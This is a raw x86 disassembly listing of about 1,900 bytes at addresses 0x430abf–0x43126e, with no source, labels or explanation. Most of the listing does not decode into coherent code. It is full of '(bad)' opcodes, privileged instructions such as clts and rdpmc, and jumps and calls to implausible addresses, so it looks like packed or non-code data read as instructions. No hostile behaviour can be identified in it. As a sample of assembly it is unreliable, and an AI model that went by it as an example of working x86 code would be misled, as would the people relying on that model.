  430abf:	rol    BYTE PTR [eax],1
  430ac1:	inc    ebp
  430ac2:	add    BYTE PTR [eax-0x7747ab3],bh
  430ac8:	clc    
  430ac9:	inc    ebp
  430aca:	retf   
  430acb:	mov    edx,ebx
  430acd:	loopne 0x430aa5
  430acf:	retf   
  430ad0:	into   
  430ad1:	into   
  430ad2:	scas   eax,DWORD PTR es:[edi]
  430ad3:	dec    ebp
  430ad4:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  430ada:	sub    ecx,esi
  430adc:	cmp    ecx,DWORD PTR [ebp+0x77]
  430adf:	(bad)  
  430ae0:	mov    edi,eax
  430ae2:	enter  0x8985,0xf8
  430ae6:	add    BYTE PTR [ebp-0x75],al
  430ae9:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430af0:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430af6:	(bad)  
  430af8:	retf   0x559c
  430afb:	(bad)  
  430afc:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430b03:	inc    ebp
  430b04:	add    eax,0xeb9c4d3f
  430b09:	(bad)  
  430b0a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430b10:	xor    ecx,DWORD PTR [ebp+0x33]
  430b13:	mov    eax,DWORD PTR [ebx]
  430b15:	in     al,dx
  430b16:	add    ecx,ebx
  430b18:	bswap  esi
  430b1a:	retf   0x55d1
  430b1d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  430b23:	jmp    0x430b1e
  430b25:	add    BYTE PTR ds:0xebf44d8b,al
  430b2b:	push   ebp
  430b2c:	mov    ebp,DWORD PTR [ebx]
  430b2e:	mov    eax,0x33f8558b
  430b33:	retf   
  430b34:	xor    ecx,esi
  430b36:	add    edx,ecx
  430b38:	add    eax,DWORD PTR [edx+0xca010f]
  430b3e:	push   ebp
  430b3f:	dec    ebp
  430b40:	mov    ecx,DWORD PTR [ebx-0x34050714]
  430b46:	stc    
  430b47:	rol    DWORD PTR ds:0xebce4dd6,cl
  430b4d:	scas   eax,DWORD PTR es:[edi]
  430b4e:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  430b54:	xor    ebp,DWORD PTR [ebx]
  430b56:	xor    edi,DWORD PTR [ebx]
  430b58:	add    esi,DWORD PTR [edi+0x3]
  430b5b:	mov    ecx,DWORD PTR [edi]
  430b5d:	clc    
  430b5e:	retf   0x55cb
  430b61:	into   
  430b62:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  430b69:	test   al,0x4d
  430b6b:	push   ebp
  430b6c:	jbe    0x430ba1
  430b6e:	mov    esi,DWORD PTR [ebx]
  430b70:	mov    al,0x3
  430b72:	push   ebp
  430b73:	add    esi,DWORD PTR [ebx]
  430b75:	rdpmc  
  430b77:	retf   0x5503
  430b7a:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430b80:	dec    ebp
  430b81:	stc    
  430b82:	mov    ecx,DWORD PTR [eax]
  430b84:	or     BYTE PTR [ebp+0x4d],cl
  430b87:	jmp    0x1370c17
  430b8c:	dec    ebp
  430b8d:	dec    ebp
  430b8e:	(bad)  
  430b8f:	mov    esp,esp
  430b91:	clc    
  430b92:	test   ebx,ecx
  430b94:	clc    
  430b95:	ror    DWORD PTR [ebp-0x2a],cl
  430b98:	mov    esi,ecx
  430b9a:	lock scas eax,DWORD PTR es:[edi]
  430b9c:	inc    ebp
  430b9d:	mov    esi,DWORD PTR [ebx]
  430b9f:	hlt    
  430ba0:	pushf  
  430ba1:	jge    0x430b2e
  430ba3:	sub    esp,esp
  430ba5:	cmp    ecx,ebx
  430ba7:	ja     0x430b77
  430ba9:	mov    ebp,DWORD PTR [eax-0x58]
  430bac:	dec    ebp
  430bad:	xor    ecx,DWORD PTR [di+0x3]
  430bb1:	mov    ebp,eax
  430bb3:	clc    
  430bb4:	push   ebp
  430bb5:	retf   
  430bb6:	mov    dl,bl
  430bb8:	adc    esi,edx
  430bba:	jb     0x430b8a
  430bbc:	add    BYTE PTR [edi-0xb7474b3],ch
  430bc2:	lock jge 0x430b90
  430bc5:	sub    ecx,DWORD PTR [ebp+0x3b]
  430bc8:	mov    esi,DWORD PTR [edi-0x28]
  430bcb:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430bd2:	mov    BYTE PTR [ebx-0x34b20729],cl
  430bd8:	mov    edx,ebx
  430bda:	lock (bad) 
  430bdc:	ror    esi,cl
  430bde:	push   ebp
  430bdf:	scas   eax,DWORD PTR es:[edi]
  430be0:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430be6:	fwait
  430be7:	sub    esi,DWORD PTR [edx]
  430be9:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430bef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430bf0:	xor    esp,DWORD PTR [ebx]
  430bf2:	add    ecx,DWORD PTR [ebp-0x18]
  430bf5:	mov    edi,DWORD PTR [ebp-0x8]
  430bf8:	mov    bl,cl
  430bfa:	cmp    dl,bl
  430bfc:	jb     0x430bcc
  430bfe:	add    dh,dl
  430c00:	dec    ebp
  430c01:	scas   eax,DWORD PTR es:[edi]
  430c02:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430c08:	shr    DWORD PTR [ebx],cl
  430c0a:	into   
  430c0b:	cmp    edx,esi
  430c0d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430c13:	dec    ebp
  430c14:	dec    ebp
  430c15:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430c1b:	retf   
  430c1c:	xor    edx,esi
  430c1e:	add    ecx,esi
  430c20:	imul   ecx,edx
  430c23:	mov    DWORD PTR [ebp+0x8],edx
  430c26:	xor    ecx,DWORD PTR [ebp+0x2b]
  430c29:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430c2f:	add    esi,DWORD PTR [ebx]
  430c31:	rol    BYTE PTR [ebx],0x45
  430c34:	rdtsc  
  430c36:	xlat   BYTE PTR ds:[ebx]
  430c37:	pushf  
  430c38:	jge    0x430bc3
  430c3a:	xor    ebx,eax
  430c3c:	sub    eax,DWORD PTR [ebp-0x73]
  430c3f:	(bad)  
  430c40:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430c47:	dec    ebp
  430c48:	xchg   BYTE PTR [ebx],dh
  430c4a:	inc    DWORD PTR [ebx]
  430c4c:	(bad)  
  430c4d:	jmp    0x430c9c
  430c4f:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430c55:	dec    ebp
  430c56:	into   
  430c57:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430c5d:	fwait
  430c5e:	shl    DWORD PTR [edx],cl
  430c60:	retf   0x5588
  430c63:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430c69:	add    eax,DWORD PTR [eax]
  430c6b:	call   0x8ace61bd
  430c70:	fcom   QWORD PTR [ecx]
  430c72:	retf   
  430c73:	jb     0x430cda
  430c75:	add    ch,cl
  430c77:	dec    ebp
  430c78:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430c7e:	dec    ebp
  430c7f:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430c85:	jge    0x430c55
  430c87:	mov    BYTE PTR [edi+0xf723b3a],ch
  430c8d:	add    cl,dh
  430c8f:	dec    ebp
  430c90:	dec    DWORD PTR [ebx-0x2c031b01]
  430c96:	inc    ebp
  430c97:	push   ebp
  430c98:	dec    DWORD PTR [ebx-0x73ff2734]
  430c9e:	lea    ebx,[ebx-0x7400cdac]
  430ca4:	push   eax
  430ca5:	mov    ah,0x45
  430ca7:	push   ebp
  430ca8:	mov    esi,DWORD PTR [ebx]
  430caa:	les    esi,FWORD PTR [ebx]
  430cac:	add    BYTE PTR [ebx],al
  430cae:	inc    DWORD PTR [ebx]
  430cb0:	mov    ecx,DWORD PTR [edi]
  430cb2:	cld    
  430cb3:	retf   0x4d80
  430cb6:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430cbc:	jne    0x430c49
  430cbe:	jmp    eax
  430cc0:	ror    bl,1
  430cc2:	or     cl,dh
  430cc4:	add    BYTE PTR [edi-0xf2f7475],ch
  430cca:	not    bl
  430ccc:	adc    al,0xca
  430cce:	inc    ebp
  430ccf:	push   ebp
  430cd0:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430cd6:	push   0xaf80d6
  430cdb:	mov    eax,DWORD PTR [eax]
  430cdd:	in     al,0xff
  430cdf:	sti    
  430ce0:	sbb    dh,cl
  430ce2:	pop    esi
  430ce3:	xchg   esp,eax
  430ce4:	leave  
  430ce5:	fwait
  430ce6:	add    al,0x32
  430ce8:	push   ebp
  430ce9:	cmp    ebp,esp
  430ceb:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430cef:	dec    DWORD PTR [ecx-0x740f0375]
  430cf5:	push   ebp
  430cf6:	cld    
  430cf7:	xor    ebp,ebx
  430cf9:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430cff:	push   ebp
  430d00:	clc    
  430d01:	xor    esi,ecx
  430d03:	add    esi,DWORD PTR [ebp-0x75]
  430d06:	(bad)  
  430d07:	hlt    
  430d08:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430d0f:	mov    DWORD PTR [esi],eax
  430d11:	hlt    
  430d12:	(bad)  
  430d13:	dec    ebp
  430d14:	add    esi,DWORD PTR [ebx]
  430d16:	(bad)  
  430d17:	mov    edx,0xffc68d0a
  430d1c:	add    dl,cl
  430d1e:	leave  
  430d1f:	push   ebp
  430d20:	push   ebp
  430d21:	mov    ebp,esp
  430d23:	fcom   QWORD PTR [ecx+0x7d]
  430d26:	inc    ebp
  430d27:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430d2d:	iret   
  430d2e:	cld    
  430d2f:	retf   0x868f
  430d32:	loopne 0x430d31
  430d34:	mov    edi,edi
  430d36:	mov    esi,DWORD PTR [ebp-0x8]
  430d39:	mov    esi,eax
  430d3b:	cld    
  430d3c:	jne    0x430cee
  430d3e:	mov    BYTE PTR [ecx],0xa
  430d41:	add    dh,al
  430d43:	test   DWORD PTR [eax],ecx
  430d45:	inc    esi
  430d47:	inc    DWORD PTR [edi]
  430d49:	mov    eax,esi
  430d4b:	cld    
  430d4c:	add    DWORD PTR [eax+0x901c6],eax
  430d52:	leave  
  430d53:	xor    BYTE PTR [ebp+0x45],dl
  430d56:	in     al,dx
  430d57:	mov    edx,DWORD PTR [ecx-0x40]
  430d5a:	inc    ebp
  430d5b:	add    BYTE PTR [ecx-0x74000301],cl
  430d61:	int3   
  430d62:	cld    
  430d63:	jne    0x430d1d
  430d65:	call   0xcc2070
  430d6a:	mov    esi,DWORD PTR [ebp-0x8]
  430d6d:	test   eax,esi
  430d6f:	je     0x430de6
  430d71:	mov    eax,esi
  430d73:	cld    
  430d74:	add    al,0x80
  430d76:	add    WORD PTR [ecx+0x0],ax
  430d7a:	fiadd  DWORD PTR [eax]
  430d7c:	mov    BYTE PTR [eax],0x3d
  430d7f:	push   0xffffffc3
  430d81:	push   esi
  430d82:	mov    edx,DWORD PTR [eax+0x51]
  430d85:	pop    edi
  430d86:	lea    ebx,[ebx-0x8]
  430d89:	ret    0x45
  430d8c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d92:	xchg   eax,edi
  430d94:	mov    DWORD PTR [ebp-0x75],ecx
  430d97:	push   esi
  430d98:	clc    
  430d99:	jne    0x430d6b
  430d9b:	mov    ecx,0xf8450b0b
  430da0:	(bad)  
  430da1:	push   cs
  430da2:	or     BYTE PTR [ebp-0x3a],dh
  430da5:	cmp    eax,DWORD PTR [ecx]
  430da7:	pop    esi
  430da8:	(bad)  
  430da9:	or     al,0x5
  430dab:	inc    eax
  430dac:	leave  
  430dad:	jmp    0x40cf:0x25564204
  430db4:	leave  
  430db5:	in     eax,dx
  430db6:	inc    DWORD PTR [eax-0x75]
  430db9:	fimul  DWORD PTR [ebx-0x228139be]
  430dbf:	inc    eax
  430dc0:	nop
  430dc1:	loopne 0x430dc2
  430dc3:	ret    
  430dc4:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430dca:	add    eax,0xff45e8f8
  430dcf:	push   esi
  430dd0:	push   DWORD PTR [ebp-0x39]
  430dd3:	mov    eax,0x7edda46
  430dd8:	or     al,0x6
  430dda:	push   DWORD PTR [ebp-0x3a]
  430ddd:	cmp    eax,DWORD PTR [edx]
  430ddf:	pop    esi
  430de0:	ret    
  430de1:	or     al,0x56
  430de3:	inc    ecx
  430de4:	push   ebp
  430de5:	jle    0x430dd3
  430de7:	inc    edx
  430de8:	inc    ebp
  430de9:	int    0x1
  430deb:	inc    ecx
  430dec:	sub    BYTE PTR ds:0xe77541fc,ah
  430df2:	add    DWORD PTR [edx+0x1c],eax
  430df5:	retf   0xc38b
  430df8:	adc    al,0x8b
  430dfa:	xchg   edx,eax
  430dfb:	push   ecx
  430dfc:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430e02:	rcl    DWORD PTR [esi-0x9],cl
  430e05:	jne    0x430e57
  430e07:	mov    eax,0x7c80ece
  430e0c:	rol    DWORD PTR [esi],cl
  430e0e:	div    DWORD PTR [ebp+0x50]
  430e11:	cmp    ecx,edx
  430e13:	pop    esi
  430e14:	dec    BYTE PTR [edx]
  430e16:	in     al,dx
  430e17:	inc    edx
  430e18:	sub    esp,ecx
  430e1a:	inc    eax
  430e1b:	(bad)  
  430e1c:	push   eax
  430e1d:	add    edx,DWORD PTR [eax-0x1f]
  430e20:	push   edi
  430e21:	add    dh,dh
  430e23:	leave  
  430e24:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430e28:	add    BYTE PTR [ecx+0x0],dl
  430e2b:	inc    ebp
  430e2c:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430e32:	add    BYTE PTR [eax-0x7fbf448],bh
  430e38:	add    al,0x2
  430e3a:	jmp    0x57eb994
  430e3f:	jne    0x430e29
  430e41:	mov    eax,DWORD PTR [edx]
  430e43:	or     BYTE PTR [eax],al
  430e45:	inc    ecx
  430e46:	stc    
  430e47:	in     eax,dx
  430e48:	ss inc eax
  430e4a:	aas    
  430e4b:	out    0x7d,eax
  430e4d:	inc    ecx
  430e4e:	mov    ebp,ecx
  430e50:	lock ret 0x7d
  430e54:	and    ecx,DWORD PTR [ebx-0x171777]
  430e5a:	add    bh,bh
  430e5c:	aad    0xd7
  430e5e:	add    dh,cl
  430e60:	clts   
  430e62:	(bad)  
  430e63:	call   0xffce0d68
  430e68:	hlt    
  430e69:	iret   
  430e6a:	jge    0x430e42
  430e6c:	rol    DWORD PTR [esi-0x80],cl
  430e6f:	jmp    0x1c5d7c
  430e74:	out    dx,al
  430e75:	mov    eax,DWORD PTR [ebx]
  430e77:	(bad)  
  430e78:	pop    esi
  430e79:	push   es
  430e7a:	cmp    al,0xe8
  430e7c:	sar    edi,0x8
  430e7f:	inc    DWORD PTR [edi]
  430e81:	inc    esi
  430e82:	(bad)  
  430e83:	loopne 0x430f03
  430e85:	push   edi
  430e86:	push   cs
  430e87:	push   ebx
  430e88:	add    BYTE PTR [ebx+0x24008b56],cl
  430e8e:	add    BYTE PTR [ebp+0x50],al
  430e91:	push   eax
  430e92:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e98:	sub    edx,DWORD PTR [esi-0x24]
  430e9b:	jne    0x430e53
  430e9d:	lods   eax,DWORD PTR ds:[esi]
  430e9e:	mov    edx,DWORD PTR [edx-0x34]
  430ea1:	dec    esi
  430ea2:	out    0x83,eax
  430ea4:	into   
  430ea5:	push   edi
  430ea7:	loopne 0x430e77
  430ea9:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430ead:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430eb4:	rol    DWORD PTR [edx],0x8
  430eb7:	mov    esp,ecx
  430eb9:	cmp    DWORD PTR [ebx],0xc
  430ebc:	mov    esi,0x5001c0
  430ec1:	push   eax
  430ec2:	push   cs
  430ec3:	push   eax
  430ec4:	(bad)  
  430ec5:	sub    edx,edi
  430ec7:	push   esi
  430ec8:	adc    al,0xcb
  430eca:	ins    DWORD PTR es:[edi],dx
  430ecb:	mov    eax,0x203e8
  430ed0:	add    al,ah
  430ed2:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430ed9:	add    dh,al
  430edb:	add    ah,ch
  430edd:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430ee3:	pop    ecx
  430ee4:	or     eax,ebx
  430ee6:	cli    
  430ee7:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430eed:	lea    ebp,[ebx]
  430eef:	mov    edx,DWORD PTR [edx-0x4]
  430ef2:	dec    ecx
  430ef3:	inc    ebp
  430ef4:	shr    BYTE PTR [ebx],0x4b
  430ef7:	and    al,0x0
  430ef9:	(bad)  
  430efa:	jne    0x430f41
  430efc:	pop    eax
  430efd:	mov    al,0x5a
  430eff:	call   0x142115e
  430f04:	and    al,0x85
  430f06:	push   edx
  430f07:	add    BYTE PTR [eax+eax*1+0x0],ah
  430f0b:	dec    ebp
  430f0c:	mov    cl,0x23
  430f0e:	jmp    0x430efc
  430f10:	mov    al,0xe7
  430f12:	call   0x1391200
  430f17:	shr    DWORD PTR [eax+ebx*2],cl
  430f1a:	lock (bad) 
  430f1c:	adc    eax,0x757f008d
  430f21:	out    0x58,eax
  430f23:	cmp    al,0x7
  430f25:	pop    edx
  430f26:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430f2d:	push   ecx
  430f2e:	cld    
  430f2f:	mov    esi,0x3b0175
  430f34:	and    al,0xb0
  430f36:	xor    BYTE PTR [edx+0x1],0x8b
  430f3a:	add    ah,bh
  430f3c:	mov    edi,DWORD PTR [ebp-0x4]
  430f3f:	psubsw mm7,QWORD PTR [edi]
  430f42:	add    DWORD PTR [ebp+0x0],ebp
  430f45:	rcr    eax,1
  430f47:	mov    edi,ecx
  430f49:	and    eax,DWORD PTR [eax]
  430f4b:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430f51:	call   0x130123a
  430f56:	add    al,cl
  430f58:	mov    ebp,esi
  430f5a:	aam    0x83
  430f5c:	or     DWORD PTR [ecx],eax
  430f5e:	jne    0x430f51
  430f60:	mov    eax,DWORD PTR [eax]
  430f62:	aam    0x0
  430f64:	dec    ebp
  430f65:	jne    0x430ef2
  430f67:	cmp    ebx,eax
  430f69:	jb     0x430fb8
  430f6b:	jmp    0x430ef8
  430f6d:	mov    ebx,esp
  430f6f:	int3   
  430f70:	dec    ebp
  430f71:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430f78:	mov    edx,0x8b0a8b
  430f7d:	cmp    ecx,DWORD PTR [eax]
  430f7f:	jb     0x430f58
  430f81:	pop    edx
  430f82:	push   edi
  430f83:	cli    
  430f84:	pop    es
  430f85:	mov    eax,ecx
  430f87:	jb     0x430f8b
  430f89:	add    DWORD PTR [ebx],0xa
  430f8c:	mov    eax,DWORD PTR [ebx]
  430f8e:	int3   
  430f8f:	add    bh,BYTE PTR [esi+0x75d10006]
  430f95:	jmp    0x430f22
  430f97:	mov    al,0xe8
  430f99:	call   0x104121b
  430f9e:	add    edx,DWORD PTR [ecx+ecx*8]
  430fa1:	pop    edi
  430fa2:	or     BYTE PTR [ecx-0x73],bl
  430fa5:	pop    ecx
  430fa6:	inc    edi
  430fa7:	xor    al,0xeb
  430fa9:	push   ecx
  430faa:	mov    edi,DWORD PTR [edx+0xc506cc]
  430fb0:	call   0xb210b5
  430fb5:	int3   
  430fb6:	sbb    BYTE PTR [esi],ch
  430fb8:	inc    ebp
  430fb9:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430fbf:	call   0x9c122e
  430fc4:	or     BYTE PTR [ebx-0x73],dl
  430fc7:	cmp    al,0x47
  430fc9:	mov    al,0x1
  430fcb:	jb     0x430fcd
  430fcd:	mov    al,0x10
  430fcf:	push   eax
  430fd0:	add    al,0x75
  430fd2:	add    BYTE PTR [ebx],ch
  430fd4:	add    ebx,esp
  430fd6:	int3   
  430fd7:	jne    0x430fe9
  430fd9:	movsx  edx,cl
  430fdc:	add    DWORD PTR [eax],eax
  430fde:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430fe5:	mov    gs,edi
  430fe7:	add    BYTE PTR [eax-0x50],ch
  430fea:	add    al,ch
  430fec:	mov    eax,DWORD PTR [ecx]
  430fee:	sub    eax,DWORD PTR [eax]
  430ff0:	jb     0x431067
  430ff2:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430ff6:	jge    0x430fe0
  430ff8:	add    al,0x1
  430ffa:	add    DWORD PTR [eax],0x0
  430ffd:	jne    0x430fff
  430fff:	je     0x431046
  431001:	mov    eax,DWORD PTR [edi]
  431003:	ror    BYTE PTR [ebp+0x4d],1
  431006:	or     DWORD PTR [ecx+0x4d03d004],0x3
  43100d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  431013:	mov    DWORD PTR [ebx],ebp
  431015:	fadd   DWORD PTR [eax+0x75]
  431018:	inc    eax
  431019:	pop    eax
  43101a:	lea    ebx,[ecx+0x4f]
  43101d:	push   0xb1000003
  431022:	out    dx,eax
  431023:	add    ebp,DWORD PTR [edx+edx*2]
  431026:	add    BYTE PTR [ebx+ecx*4],bh
  431029:	mov    ch,BYTE PTR [ebx]
  43102b:	jb     0x43109f
  43102d:	add    al,0x89
  43102f:	push   eax
  431030:	call   0x842b5da2
  431035:	add    DWORD PTR [eax+eax*1],eax
  431038:	jae    0x43104e
  43103a:	icebp  
  43103b:	inc    ebp
  43103c:	mov    eax,DWORD PTR gs:[ecx]
  43103f:	int3   
  431040:	out    dx,al
  431041:	loopne 0x431090
  431043:	sub    eax,DWORD PTR [edx]
  431045:	push   0xffffff83
  431047:	pop    esi
  431048:	push   cs
  431049:	jl     0x431064
  43104b:	add    al,0xaf
  43104d:	xor    eax,0x832b6d00
  431052:	mov    eax,DWORD PTR [edx]
  431054:	rcr    BYTE PTR [ebp+0x754500dc],cl
  43105a:	ror    DWORD PTR [ebx+0x7dc8e803],1
  431060:	inc    ebp
  431061:	shr    ebx,0x3
  431064:	or     DWORD PTR [eax],0x4
  431067:	push   0xffffffa5
  431069:	pop    esi
  43106a:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431071:	jmp    0x4310d0
  431073:	mov    edi,0xff0272
  431078:	fdivr  QWORD PTR [ebp+0x5d]
  43107b:	push   0x4e
  43107d:	pop    ecx
  43107e:	call   0x435483
  431083:	mov    DWORD PTR [ebx],eax
  431085:	in     al,0xc8
  431087:	rol    BYTE PTR [ebp-0x75],0xc1
  43108b:	call   0xad126c
  431090:	pop    esi
  431091:	enter  0xceff,0x8b
  431095:	repz mov ecx,DWORD PTR [ebp-0x34]
  431099:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  4310a0:	je     0x4310a2
  4310a2:	or     DWORD PTR [ebx-0x74183b24],eax
  4310a8:	jne    0x43108e
  4310aa:	jmp    0x4310a5
  4310ac:	push   DWORD PTR [edx-0x24]
  4310af:	push   0x4d
  4310b1:	pop    ecx
  4310b2:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  4310b6:	jge    0x4310be
  4310b8:	mov    eax,eax
  4310ba:	sub    ebp,DWORD PTR [edx+0x24]
  4310bd:	pop    esi
  4310be:	inc    ebp
  4310bf:	mov    esp,0x8b6077
  4310c4:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  4310ca:	lods   al,BYTE PTR ds:[esi]
  4310cb:	add    BYTE PTR [ebx],bh
  4310cd:	enter  0xce73,0x49
  4310d1:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  4310d9:	stc    
  4310da:	jge    0x43114e
  4310dc:	jnp    0xdd42944b
  4310e2:	call   0xc611b8
  4310e7:	fadd   st(0),st
  4310e9:	dec    esi
  4310ea:	ins    BYTE PTR es:[edi],dx
  4310eb:	stc    
  4310ec:	cmp    al,0x73
  4310ee:	push   ebp
  4310ef:	mov    eax,0xf8028b
  4310f4:	jne    0x4310b7
  4310f6:	mov    esi,ecx
  4310f8:	mov    esp,DWORD PTR [ebp+0x2c]
  4310fb:	add    edi,DWORD PTR [ebp-0x24]
  4310fe:	sub    esp,eax
  431100:	and    al,0x45
  431102:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431108:	sbb    al,0xee
  43110a:	pop    esi
  43110b:	call   0x83113b
  431110:	fsubr  st,st(3)
  431112:	sti    
  431113:	add    BYTE PTR gs:[ecx],bh
  431116:	add    eax,esp
  431118:	add    DWORD PTR [esi],eax
  43111a:	rol    DWORD PTR [ebp+0x8],0x29
  43111e:	mov    esp,eax
  431120:	clc    
  431121:	jne    0x431198
  431123:	mov    eax,0x8b0673
  431128:	loopne 0x43116f
  43112a:	loopne 0x4310b5
  43112c:	lods   al,BYTE PTR ds:[esi]
  43112d:	int3   
  43112e:	inc    ebp
  43112f:	mov    DWORD PTR gs:[eax+edi*8],eax
  431133:	add    al,0xc3
  431135:	sub    ecx,DWORD PTR [ebp+0x47]
  431138:	(bad)  
  43113a:	shr    BYTE PTR [ebp-0x1f],0xe8
  43113e:	add    eax,DWORD PTR [eax]
  431140:	call   0x644d245
  431145:	add    esi,DWORD PTR [esi-0x3b2efc83]
  43114b:	dec    esi
  43114c:	ins    DWORD PTR es:[edi],dx
  43114d:	in     al,dx
  43114e:	lea    eax,[eax]
  431150:	inc    ebp
  431151:	inc    ebp
  431152:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431158:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431162:	and    al,0xdc
  431164:	ror    DWORD PTR [edx+0x24],0xf7
  431168:	or     BYTE PTR [ebp+0x4c],dh
  43116b:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  43116f:	stos   BYTE PTR es:[edi],al
  431170:	adc    edx,edi
  431172:	inc    esp
  431173:	add    edi,DWORD PTR [eax]
  431175:	jne    0x43115a
  431177:	mov    DWORD PTR [eax-0x7449db04],ecx
  43117d:	cmp    ecx,DWORD PTR [edi]
  43117f:	sub    BYTE PTR [ebp-0x7e],dl
  431182:	sar    ebp,0xb
  431185:	jmp    FWORD PTR [edi+0x2400392a]
  43118b:	sub    esi,DWORD PTR [ebx-0x73]
  43118e:	mov    esp,DWORD PTR [ecx+edi*4]
  431191:	mov    ecx,DWORD PTR [eax]
  431193:	and    BYTE PTR [eax],al
  431195:	jne    0x431161
  431197:	sub    ebp,ecx
  431199:	sbb    BYTE PTR [esi+0x32],ah
  43119c:	dec    ebp
  43119d:	push   ebp
  43119e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  4311a4:	ret    
  4311a5:	mov    edx,ebp
  4311a7:	leave  
  4311a8:	sub    DWORD PTR [esi+0x24],ebx
  4311ab:	ret    0x2b
  4311ae:	pop    ax
  4311b0:	push   ebp
  4311b1:	rol    BYTE PTR [ebx],0xeb
  4311b4:	add    DWORD PTR [ecx+0x6c0001],0x40
  4311bb:	jb     0x431212
  4311bd:	ret    
  4311be:	in     al,dx
  4311bf:	jecxz  0x43114c
  4311c1:	push   esi
  4311c2:	xchg   esp,eax
  4311c3:	jne    0x4311c5
  4311c5:	cmp    edx,DWORD PTR [esi+0x1c]
  4311c8:	jne    0x4311ae
  4311ca:	mov    eax,DWORD PTR [ebp-0x77]
  4311cd:	ror    DWORD PTR [ebx+0x899408],0xe0
  4311d4:	mov    esi,DWORD PTR [ebp-0x75]
  4311d7:	pop    esi
  4311d8:	nop
  4311d9:	mov    eax,DWORD PTR [eax]
  4311db:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4311e1:	add    al,0x0
  4311e3:	inc    ebp
  4311e4:	mov    eax,DWORD PTR [ebx]
  4311e6:	mov    ebp,ebx
  4311e8:	cmp    al,0xf
  4311ea:	or     al,al
  4311ec:	inc    ebp
  4311ed:	inc    ebp
  4311ee:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  4311f4:	cld    
  4311f5:	add    BYTE PTR [edi+0x546c16c0],dh
  4311fb:	add    BYTE PTR [ecx-0x5],dl
  4311fe:	add    eax,0x17200
  431203:	sbb    al,0x85
  431205:	dec    esp
  431206:	je     0x431240
  431208:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43120c:	add    BYTE PTR [ebx],bh
  43120e:	(bad)  
  43120f:	and    al,0x32
  431211:	jae    0x4311af
  431213:	mov    cl,cl
  431215:	inc    DWORD PTR [esp]
  431218:	push   ebp
  431219:	shr    esp,0x8
  43121c:	in     al,dx
  43121d:	push   esp
  43121e:	add    DWORD PTR [eax],esp
  431220:	add    bl,cl
  431222:	inc    ebp
  431223:	mov    bh,0x89
  431225:	add    ah,bh
  431227:	jmp    0xca752171
  43122c:	pushf  
  43122d:	dec    esp
  43122e:	mov    edx,0xf8178520
  431233:	fst    DWORD PTR [ebp+0x0]
  431236:	mov    BYTE PTR [eax],0xc4
  431239:	sub    edx,DWORD PTR [ebx-0x3f]
  43123c:	inc    ebp
  43123d:	add    eax,0xc601da
  431242:	mov    al,0xc6
  431245:	ins    BYTE PTR es:[edi],dx
  431246:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  43124d:	dec    esp
  43124e:	jmp    DWORD PTR [eax]
  431250:	inc    ebp
  431251:	fnstcw WORD PTR [esi+0x29]
  431254:	test   BYTE PTR [eax],0xc8
  431257:	rol    BYTE PTR [eax],0xc0
  43125a:	lea    ecx,[ebp-0x3cf0dbcb]
  431260:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  431266:	inc    esi
  431267:	add    DWORD PTR [eax],ebx
  431269:	add    dh,bh
  43126b:	mov    esi,DWORD PTR [edx+0x8]
  43126e:	(bad)  
